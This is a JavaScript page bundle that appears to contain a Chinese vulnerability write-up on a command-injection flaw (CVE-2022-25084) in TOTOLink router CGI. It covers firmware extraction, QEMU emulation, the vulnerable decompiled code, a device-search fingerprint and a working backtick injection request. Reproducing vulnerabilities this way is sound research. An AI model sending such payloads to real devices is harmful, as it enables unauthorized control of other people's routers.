import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as t}from"./app-58e4a7d6.js";const n={},d=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>TOTOLink 多个设备 download.cgi文件存在远程命令执行漏洞，攻击者通过构造特殊的请求可以获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>TOTOLink 多个设备
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;totolink&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>下载路由器固件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191806401.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用binwalk分解固件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191807189.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看分解出来的文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191807833.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用qemu搭建路由器</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#set network
sudo brctl addbr virbr2
sudo ifconfig virbr2 192.168.6.1/24 up
sudo tunctl -t tap2
sudo ifconfig tap2 192.168.6.11/24 up
sudo brctl addif virbr2 tap2

qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1&quot; -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建后在qemu里执行命令启动路由器</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ifconfig eth0 192.168.6.11 up 
scp -r squashfs-root/ root@192.168.6.11:/root/    	
chroot ./squashfs-root/ /bin/sh
touch /var/run/lighttpd.pid
./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意 <code>lighttpd.conf</code> 文件需要修改 <code>server.pid-file</code> 参数</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191807515.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>启动后访问路由器页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191807814.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们找到需要分析的文件目录 <code>squashfs-root/web_cste/cgi-bin</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191808361.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>分析 cgi文件 <code>downloadFile.cgi</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191808273.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们注意到其中的system执行命令</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pcVar1 = getenv(&quot;QUERY_STRING&quot;);
memset(acStack1424,0,0x200);
memset(acStack912,0,0x200);
sprintf(acStack1424,&quot;echo QUERY_STRING:%s &gt;/tmp/download&quot;,pcVar1);
system(acStack1424);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中 getenv 从请求Url中获取参数,传参给pcVar1，再通过下面的sprintf 赋值给 acStack1424 使用 system函数 进行命令执行</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191808559.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们构造请求包控制 QUERY_STRING 参数来进行恶意命令执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/cgi-bin/downloadFlile.cgi?payload=\`ls&gt;../cmd.txt\`
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191808272.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,32),s=[d];function l(c,r){return i(),a("div",null,s)}const g=e(n,[["render",l],["__file","TOTOLink 多个设备 download.cgi 远程命令执行漏洞 CVE-2022-25084.html.vue"]]);export{g as default};
